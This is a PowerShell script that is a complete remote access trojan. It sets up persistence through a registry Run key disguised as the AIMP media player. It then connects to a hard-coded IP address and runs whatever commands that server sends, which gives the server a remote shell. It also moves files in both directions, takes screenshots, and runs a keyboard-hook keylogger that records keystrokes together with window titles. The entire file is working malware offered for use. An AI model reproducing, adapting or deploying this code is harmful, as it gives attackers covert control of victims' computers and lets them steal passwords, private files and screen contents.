$client = $null;
$stream = $null;
$buffer = $null;
$writer = $null;
$command = $null;
$file_path = $null;
$path57 = $null;
$path58 = $null;
$data = $null;
$upload_mas = $null;
$upload_name = $null;
$real_data = $null;
$job = $null;
$upload_length = $null;
$result = $null;
$upload_flag = "False";
$up_len = $null;
$Ar = @();
$IP = "82.146.40.245"

$HKCU_Run = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\"
$Path = "C:\Program Files\AIMP\client.vbs"
New-ItemProperty -Path $HKCU_Run -Name "AIMP_Player" -Value $Path  -PropertyType "String"

#Define helper function that generates and saves screenshot
function screenshot([String]$ScreenPath) {
    $Time = (Get-Date)
    [String] $FileName = "$($Time.Month)"
    $FileName += '-'
    $FileName += "$($Time.Day)" 
    $FileName += '-'
    $FileName += "$($Time.Year)"
    $FileName += '-'
    $FileName += "$($Time.Hour)"
    $FileName += '-'
    $FileName += "$($Time.Minute)"
    $FileName += '-'
    $FileName += "$($Time.Second)"
    $FileName += '.png'
    
    [String] $FilePath = (Join-Path $ScreenPath $FileName)

    Add-Type -Assembly System.Windows.Forms   
    $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
    $VideoController = Get-WmiObject -Query 'SELECT VideoModeDescription FROM Win32_VideoController'

    if ($VideoController.VideoModeDescription -and $VideoController.VideoModeDescription -match '(?<ScreenWidth>^\d+) x (?<ScreenHeight>\d+) x .*$') {
        $Width = [Int] $Matches['ScreenWidth']
        $Height = [Int] $Matches['ScreenHeight']
    } else {
       $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen

        $Width = $ScreenBounds.Width
        $Height = $ScreenBounds.Height
    }

    $Size = New-Object System.Drawing.Size($Width, $Height)
    $Point = New-Object System.Drawing.Point(0, 0)

    $ScreenshotObject = New-Object Drawing.Bitmap $Width, $Height
    $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
    $DrawingGraphics.CopyFromScreen($Point, [Drawing.Point]::Empty, $Size)
    $DrawingGraphics.Dispose()
    $ScreenshotObject.Save($FilePath)
    $ScreenshotObject.Dispose()
    return
}
$screenstart = {
    param([string]$path57, [int]$time)
    function screenshot([String]$ScreenPath) {
        $Time = (Get-Date)
        [String] $FileName = "$($Time.Month)"
        $FileName += '-'
        $FileName += "$($Time.Day)" 
        $FileName += '-'
        $FileName += "$($Time.Year)"
        $FileName += '-'
        $FileName += "$($Time.Hour)"
        $FileName += '-'
        $FileName += "$($Time.Minute)"
        $FileName += '-'
        $FileName += "$($Time.Second)"
        $FileName += '.png'
    
        [String] $FilePath = (Join-Path $ScreenPath $FileName)

        Add-Type -Assembly System.Windows.Forms   
        $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
        $VideoController = Get-WmiObject -Query 'SELECT VideoModeDescription FROM Win32_VideoController'

        if ($VideoController.VideoModeDescription -and $VideoController.VideoModeDescription -match '(?<ScreenWidth>^\d+) x (?<ScreenHeight>\d+) x .*$') {
            $Width = [Int] $Matches['ScreenWidth']
            $Height = [Int] $Matches['ScreenHeight']
        } else {
           $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen

            $Width = $ScreenBounds.Width
            $Height = $ScreenBounds.Height
        }

        $Size = New-Object System.Drawing.Size($Width, $Height)
        $Point = New-Object System.Drawing.Point(0, 0)

        $ScreenshotObject = New-Object Drawing.Bitmap $Width, $Height
        $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
        $DrawingGraphics.CopyFromScreen($Point, [Drawing.Point]::Empty, $Size)
        $DrawingGraphics.Dispose()
        $ScreenshotObject.Save($FilePath)
        $ScreenshotObject.Dispose()
        return
    }
    while($true){
        screenshot $path57
        start-sleep -s $time
    }
}

$keylog = {
    Param (
        [Parameter(Position = 0)]
        [String]$LogPath,

        [Parameter(Position = 1)]
        [Double]$Timeout
    )
    function Keylog([String]$LogPath, [Double]$Timeout) {
        $LogPath = Join-Path (Resolve-Path (Split-Path -Parent $LogPath)) (Split-Path -Leaf $LogPath)

        $Script = {
            Param (
                [Parameter(Position = 0)]
                [String]$LogPath,

                [Parameter(Position = 1)]
                [Double]$Timeout
            )

            function local:Get-DelegateType {
                Param (
                    [OutputType([Type])]
                
                    [Parameter( Position = 0)]
                    [Type[]]
                    $Parameters = (New-Object Type[](0)),
                
                    [Parameter( Position = 1 )]
                    [Type]
                    $ReturnType = [Void]
                )

                $Domain = [AppDomain]::CurrentDomain
                $DynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegate')
                $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
                $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
                $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
                $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
                $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
                $MethodBuilder.SetImplementationFlags('Runtime, Managed')
            
                $TypeBuilder.CreateType()
            }
            function local:Get-ProcAddress {
                Param (
                    [OutputType([IntPtr])]
            
                    [Parameter( Position = 0, Mandatory = $True )]
                    [String]
                    $Module,
                
                    [Parameter( Position = 1, Mandatory = $True )]
                    [String]
                    $Procedure
                )

                # Get a reference to System.dll in the GAC
                $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
                    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
                $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
                # Get a reference to the GetModuleHandle and GetProcAddress methods
                $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
                $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
                # Get a handle to the module specified
                $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
                $tmpPtr = New-Object IntPtr
                $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
            
                # Return the address of the function
                $GetProcAddress.Invoke($null, @([Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
            }

            #region Imports

            [void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')

            # SetWindowsHookEx
            $SetWindowsHookExAddr = Get-ProcAddress user32.dll SetWindowsHookExA
            $SetWindowsHookExDelegate = Get-DelegateType @([Int32], [MulticastDelegate], [IntPtr], [Int32]) ([IntPtr])
            $SetWindowsHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetWindowsHookExAddr, $SetWindowsHookExDelegate)

            # CallNextHookEx
            $CallNextHookExAddr = Get-ProcAddress user32.dll CallNextHookEx
            $CallNextHookExDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr], [IntPtr]) ([IntPtr])
            $CallNextHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CallNextHookExAddr, $CallNextHookExDelegate)

            # UnhookWindowsHookEx
            $UnhookWindowsHookExAddr = Get-ProcAddress user32.dll UnhookWindowsHookEx
            $UnhookWindowsHookExDelegate = Get-DelegateType @([IntPtr]) ([Void])
            $UnhookWindowsHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UnhookWindowsHookExAddr, $UnhookWindowsHookExDelegate)

            # PeekMessage
            $PeekMessageAddr = Get-ProcAddress user32.dll PeekMessageA
            $PeekMessageDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([Void])
            $PeekMessage = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PeekMessageAddr, $PeekMessageDelegate)

            # GetAsyncKeyState
            $GetAsyncKeyStateAddr = Get-ProcAddress user32.dll GetAsyncKeyState
            $GetAsyncKeyStateDelegate = Get-DelegateType @([Windows.Forms.Keys]) ([Int16])
            $GetAsyncKeyState = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAsyncKeyStateAddr, $GetAsyncKeyStateDelegate)

            # GetForegroundWindow
            $GetForegroundWindowAddr = Get-ProcAddress user32.dll GetForegroundWindow
            $GetForegroundWindowDelegate = Get-DelegateType @() ([IntPtr])
            $GetForegroundWindow = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetForegroundWindowAddr, $GetForegroundWindowDelegate)

            # GetWindowText
            $GetWindowTextAddr = Get-ProcAddress user32.dll GetWindowTextA
            $GetWindowTextDelegate = Get-DelegateType @([IntPtr], [Text.StringBuilder], [Int32]) ([Void])
            $GetWindowText = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetWindowTextAddr, $GetWindowTextDelegate)

            # GetModuleHandle
            $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
            $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
            $GetModuleHandle = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        
            #endregion Imports

            $CallbackScript = {
                Param (
                    [Parameter()]
                    [Int32]$Code,

                    [Parameter()]
                    [IntPtr]$wParam,

                    [Parameter()]
                    [IntPtr]$lParam
                )

                $Keys = [Windows.Forms.Keys]
            
                $MsgType = $wParam.ToInt32()

                # Process WM_KEYDOWN & WM_SYSKEYDOWN messages
                if ($Code -ge 0 -and ($MsgType -eq 0x100 -or $MsgType -eq 0x104)) {
                
                    $hWindow = $GetForegroundWindow.Invoke()

                    $ShiftState = $GetAsyncKeyState.Invoke($Keys::ShiftKey)
                    if (($ShiftState -band 0x8000) -eq 0x8000) { $Shift = $true }
                    else { $Shift = $false }

                    $Caps = [Console]::CapsLock

                    # Read virtual-key from buffer
                    $vKey = [Windows.Forms.Keys][Runtime.InteropServices.Marshal]::ReadInt32($lParam)

                    # Parse virtual-key
                    if ($vKey -gt 64 -and $vKey -lt 91) { # Alphabet characters
                        if ($Shift -xor $Caps) { $Key = $vKey.ToString() }
                        else { $Key = $vKey.ToString().ToLower() }
                    }
                    elseif ($vKey -ge 96 -and $vKey -le 111) { # Number pad characters
                        switch ($vKey.value__) {
                            96 { $Key = '0' }
                            97 { $Key = '1' }
                            98 { $Key = '2' }
                            99 { $Key = '3' }
                            100 { $Key = '4' }
                            101 { $Key = '5' }
                            102 { $Key = '6' }
                            103 { $Key = '7' }
                            104 { $Key = '8' }
                            105 { $Key = '9' }
                            106 { $Key = "*" }
                            107 { $Key = "+" }
                            108 { $Key = "|" }
                            109 { $Key = "-" }
                            110 { $Key = "." }
                            111 { $Key = "/" }
                        }
                    }
                    elseif (($vKey -ge 48 -and $vKey -le 57) -or ($vKey -ge 186 -and $vKey -le 192) -or ($vKey -ge 219 -and $vKey -le 222)) {                      
                        if ($Shift) {                           
                            switch ($vKey.value__) { # Shiftable characters
                                48 { $Key = ')' }
                                49 { $Key = '!' }
                                50 { $Key = '@' }
                                51 { $Key = '#' }
                                52 { $Key = '$' }
                                53 { $Key = '%' }
                                54 { $Key = '^' }
                                55 { $Key = '&' }
                                56 { $Key = '*' }
                                57 { $Key = '(' }
                                186 { $Key = ':' }
                                187 { $Key = '+' }
                                188 { $Key = '<' }
                                189 { $Key = '_' }
                                190 { $Key = '>' }
                                191 { $Key = '?' }
                                192 { $Key = '~' }
                                219 { $Key = '{' }
                                220 { $Key = '|' }
                                221 { $Key = '}' }
                                222 { $Key = '<Double Quotes>' }
                            }
                        }
                        else {                           
                            switch ($vKey.value__) {
                                48 { $Key = '0' }
                                49 { $Key = '1' }
                                50 { $Key = '2' }
                                51 { $Key = '3' }
                                52 { $Key = '4' }
                                53 { $Key = '5' }
                                54 { $Key = '6' }
                                55 { $Key = '7' }
                                56 { $Key = '8' }
                                57 { $Key = '9' }
                                186 { $Key = ';' }
                                187 { $Key = '=' }
                                188 { $Key = ',' }
                                189 { $Key = '-' }
                                190 { $Key = '.' }
                                191 { $Key = '/' }
                                192 { $Key = '`' }
                                219 { $Key = '[' }
                                220 { $Key = '\' }
                                221 { $Key = ']' }
                                222 { $Key = '<Single Quote>' }
                            }
                        }
                    }
                    else {
                        switch ($vKey) {
                            $Keys::F1  { $Key = '<F1>' }
                            $Keys::F2  { $Key = '<F2>' }
                            $Keys::F3  { $Key = '<F3>' }
                            $Keys::F4  { $Key = '<F4>' }
                            $Keys::F5  { $Key = '<F5>' }
                            $Keys::F6  { $Key = '<F6>' }
                            $Keys::F7  { $Key = '<F7>' }
                            $Keys::F8  { $Key = '<F8>' }
                            $Keys::F9  { $Key = '<F9>' }
                            $Keys::F10 { $Key = '<F10>' }
                            $Keys::F11 { $Key = '<F11>' }
                            $Keys::F12 { $Key = '<F12>' }
                
                            $Keys::Snapshot    { $Key = '<Print Screen>' }
                            $Keys::Scroll      { $Key = '<Scroll Lock>' }
                            $Keys::Pause       { $Key = '<Pause/Break>' }
                            $Keys::Insert      { $Key = '<Insert>' }
                            $Keys::Home        { $Key = '<Home>' }
                            $Keys::Delete      { $Key = '<Delete>' }
                            $Keys::End         { $Key = '<End>' }
                            $Keys::Prior       { $Key = '<Page Up>' }
                            $Keys::Next        { $Key = '<Page Down>' }
                            $Keys::Escape      { $Key = '<Esc>' }
                            $Keys::NumLock     { $Key = '<Num Lock>' }
                            $Keys::Capital     { $Key = '<Caps Lock>' }
                            $Keys::Tab         { $Key = '<Tab>' }
                            $Keys::Back        { $Key = '<Backspace>' }
                            $Keys::Enter       { $Key = '<Enter>' }
                            $Keys::Space       { $Key = '< >' }
                            $Keys::Left        { $Key = '<Left>' }
                            $Keys::Up          { $Key = '<Up>' }
                            $Keys::Right       { $Key = '<Right>' }
                            $Keys::Down        { $Key = '<Down>' }
                            $Keys::LMenu       { $Key = '<Alt>' }
                            $Keys::RMenu       { $Key = '<Alt>' }
                            $Keys::LWin        { $Key = '<Windows Key>' }
                            $Keys::RWin        { $Key = '<Windows Key>' }
                            $Keys::LShiftKey   { $Key = '<Shift>' }
                            $Keys::RShiftKey   { $Key = '<Shift>' }
                            $Keys::LControlKey { $Key = '<Ctrl>' }
                            $Keys::RControlKey { $Key = '<Ctrl>' }
                        }
                    }

                    # Get foreground window's title
                    $Title = New-Object Text.Stringbuilder 256
                    $GetWindowText.Invoke($hWindow, $Title, $Title.Capacity)

                    # Define object properties
                    $Props = @{
                        Key = $Key
                        Time = [DateTime]::Now
                        Window = $Title.ToString()
                    }

                    $obj = New-Object psobject -Property $Props
                
                    # Stupid hack since Export-CSV doesn't have an append switch in PSv2
                    $CSVEntry = ($obj | Select-Object Key,Window,Time | ConvertTo-Csv -NoTypeInformation)[1]

                    #return results
                    Out-File -FilePath $LogPath -Append -InputObject $CSVEntry -Encoding unicode
                }
                return $CallNextHookEx.Invoke([IntPtr]::Zero, $Code, $wParam, $lParam)
            }

            # Cast scriptblock as LowLevelKeyboardProc callback
            $Delegate = Get-DelegateType @([Int32], [IntPtr], [IntPtr]) ([IntPtr])
            $Callback = $CallbackScript -as $Delegate
        
            # Get handle to PowerShell for hook
            $PoshModule = (Get-Process -Id $PID).MainModule.ModuleName
            $ModuleHandle = $GetModuleHandle.Invoke($PoshModule)

            # Set WM_KEYBOARD_LL hook
            $Hook = $SetWindowsHookEx.Invoke(0xD, $Callback, $ModuleHandle, 0)
        
            $Stopwatch = [Diagnostics.Stopwatch]::StartNew()

            while ($true) {
                if ($PSBoundParameters.Timeout -and ($Stopwatch.Elapsed.TotalMinutes -gt $Timeout)) { break }
                $PeekMessage.Invoke([IntPtr]::Zero, [IntPtr]::Zero, 0x100, 0x109, 0)
                Start-Sleep -Milliseconds 10
            }

            $Stopwatch.Stop()
        
            # Remove the hook
            $UnhookWindowsHookEx.Invoke($Hook)
        }

        # Setup KeyLogger's runspace
        $PowerShell = [PowerShell]::Create()
        [void]$PowerShell.AddScript($Script)
        [void]$PowerShell.AddArgument($LogPath)
        if ($PSBoundParameters.Timeout) { [void]$PowerShell.AddArgument($Timeout) }

        # Start KeyLogger
        [void]$PowerShell.BeginInvoke()
        if ($PassThru.IsPresent) { return $PowerShell }
    }
    Keylog -LogPath $LogPath -Timeout $Timeout

    $Stopwatch = [Diagnostics.Stopwatch]::StartNew()
    if($Timeout){
        while($true){
            if ($Stopwatch.Elapsed.TotalMinutes -gt $Timeout) { break }
            Start-Sleep -Milliseconds 10
        }
    }
    else{
        while($true){
            Start-Sleep -Milliseconds 10
        }
    }
    $Stopwatch.Stop()
}

do{
    try {
        $client = New-Object Net.Sockets.TcpClient($IP, 80);
        $stream = $client.GetStream();
        $buffer = New-Object Byte[] 1024;
        $encoding = New-Object Text.UTF8Encoding;
        $writer = New-Object IO.StreamWriter($stream);
        $writer.AutoFlush = $true;
        $writer.Write("1x8nyo1cb146o2x8o16");
        do {
            do {
                $bytes = $stream.Read($buffer, 0, $buffer.Length);
                if ($bytes -gt 0) {
                    $data = $data + $encoding.GetString($buffer, 0, $bytes);
                } else {
                    $data = "exit";
                }
            } while ($stream.DataAvailable);
            if ($data.Length -gt 0 -and $data -ne "exit") {
                if ($upload_flag -eq "True") {
                    $real_data = [string]::Concat($real_data, $data);
                    if ($real_data.Length -ge $up_len + $upload_length){
                        $upload_flag = "False";
                        $real_data = $real_data.Substring($up_len, $upload_length);
                        [System.IO.File]::WriteAllBytes($file_path, [System.Convert]::FromBase64String($real_data));
                        $writer.Write("UPLOAD OK");
                        $writer.Write("1od94jx82n7bv4");
                    }
                    else {
                        $result = "TRANSFER OK";
                    }
                }
                elseif ($data.Length -ge 8 -and $data.ToLower().Substring(0,8) -eq "download") {
                    try {
                        $file_path = Invoke-Expression -Command "pwd" | Out-String;
                        $file_path = $file_path.Split([Environment]::NewLine)[6];
                        if ($file_path[-1] -eq ' ') {
                            $file_path = $file_path.Remove($file_path.Length-1);
                        }
                        $file_path = [string]::Concat($file_path, "\", $data.Substring(9));
                        $result = [System.IO.File]::ReadAllBytes($file_path);
                    } catch {
                        $result = $_.Exception.InnerException.Message;
                        if ($result.Length -eq 0) {
                            $result = "ERROR";
                        }
                        Clear-Variable -Name "data";
                    }
                    $writer.Write([System.Convert]::ToBase64String($result));
                    $writer.Write("1od94jx82n7bv4");
                    Clear-Variable -Name "data";
                }
                elseif ($data.Length -ge 6 -and $data.ToLower().Substring(0,6) -eq "upload") {
                    $upload_flag = "True";
                    $upload_mas = $data.Split(" ");
                    $upload_name = $upload_mas[1];
                    $upload_length = [int]$upload_mas[2];
                    $up_len = $upload_mas[0].Length + $upload_mas[1].Length + $upload_mas[2].Length + 3;
                    $real_data = $data;
                    try {
                        $file_path = Invoke-Expression -Command "pwd" | Out-String;
                        $file_path = [string]::Concat($file_path.Split([Environment]::NewLine)[6], "\", $upload_name);
                        if ($real_data.Length -ge $up_len + $upload_length){
                            $upload_flag = "False";
                            $real_data = $real_data.Substring($up_len, $upload_length);
                            [System.IO.File]::WriteAllBytes($file_path, [System.Convert]::FromBase64String($real_data));
                            $writer.Write("Success");
                            $writer.Write("1od94jx82n7bv4");
                        }
                        else {
                            $result = "TRANSFER OK";
                        }
                    } catch {
                        $result = $_.Exception.InnerException.Message;
                        if ($result.Length -eq 0) {
                            $result = "ERROR";
                        }
                        Clear-Variable -Name "data";
                    }
                    Clear-Variable -Name "data";
                }
                elseif ($data.ToLower().StartsWith("screenshot")) {
                    #screenshot PATH
                    $file_path = Invoke-Expression -Command "pwd" | Out-String;
                    $file_path = $file_path.Split([Environment]::NewLine)[6].TrimEnd(" ")
                    try{
                        Write-Host $file_path
                        screenshot $file_path
                        $writer.Write("Screenshot OK");
                        $writer.Write("1od94jx82n7bv4")
                        Clear-Variable -Name "data";
                    }
                    catch{
                        $writer.Write("Screenshot ERROR");
                        $writer.Write("1od94jx82n7bv4")
                        Write-Host $error[0].Exception
                        Clear-Variable -Name "data";
                    }
                }
                elseif ($data.ToLower().StartsWith("screenstart")) {
                    try {
                        $path58 = Invoke-Expression -Command "pwd" | Out-String;
                        $path58 = $path58.Split([Environment]::NewLine)[6].TrimEnd(" ")
                        $job = start-job -scriptblock $screenstart -ArgumentList $path58,$data.Split("")[1]
                        $writer.Write("Screenstart OK");
                        $writer.Write("1od94jx82n7bv4")
                        Clear-Variable -Name "data"
                    } catch {
                        $writer.Write("Screenstart ERROR");
                        $writer.Write("1od94jx82n7bv4")
                        Write-Host $error[0].Exception
                        Clear-Variable -Name "data";
                    }
                }
                elseif ($data.ToLower().StartsWith("screenstop")) {
                    try {
                        Get-Job | Stop-Job
                        $writer.Write("Screenstop OK");
                        $writer.Write("1od94jx82n7bv4")
                        Clear-Variable -Name "data"
                    } catch {
                        $writer.Write("Screenstop ERROR");
                        $writer.Write("1od94jx82n7bv4")
                        Write-Host $error[0].Exception
                        Clear-Variable -Name "data";
                    }
                }
                elseif ($data.ToLower().StartsWith("key start")) {
                    try{
                        $LogPath = Invoke-Expression -Command "pwd" | Out-String;
                        $LogPath = $LogPath.Split([Environment]::NewLine)[6].TrimEnd(" ")
                        $LogPath = [string]::Concat($LogPath, "\key.log");

                        if($data.Split("")[2]){
                            $Timeout = [Double]$data.Split("")[2]
                        }
                        else{
                            $Timeout = $null
                        }
                        $job = Start-Job -scriptblock $keylog -ArgumentList $LogPath, $Timeout
                        $writer.Write("Keylogger start OK");
                        $writer.Write("1od94jx82n7bv4")
                        Clear-Variable -Name "data"
                    } catch {
                        $writer.Write("Keylogger start ERROR");
                        $writer.Write("1od94jx82n7bv4")
                        Write-Host $error[0].Exception
                        Clear-Variable -Name "data";
                    }
                }
                elseif ($data.ToLower().StartsWith("key stop")){
                    try {
                        Get-Job | Stop-Job
                        $writer.Write("Keylogger stop OK");
                        $writer.Write("1od94jx82n7bv4")
                        Clear-Variable -Name "data"
                    } catch {
                        $writer.Write("Keylogger stop ERROR");
                        $writer.Write("1od94jx82n7bv4")
                        Write-Host $error[0].Exception
                        Clear-Variable -Name "data";
                    }
                }
                else {
                    try {
                        $result = Invoke-Expression -Command $data | Out-String;
                    } catch {
                        $result = $_.Exception.InnerException.Message;
                        Clear-Variable -Name "data";
                    }
                    if ($result.Length -eq 0) {
                        $result = "OK";
                    }
                    $writer.Write($result);
                    $writer.Write("1od94jx82n7bv4");
                    Clear-Variable -Name "data";
                }
            }
        } while ($data -ne "exit");
    } catch {
        Write-Host $_.Exception.InnerException.Message;
    } finally {
        if ($data -ne $null) {
            Clear-Variable -Name "data";
        }
        if ($result -ne $null) {
            Clear-Variable -Name "result";
        }
    }
} while ($true)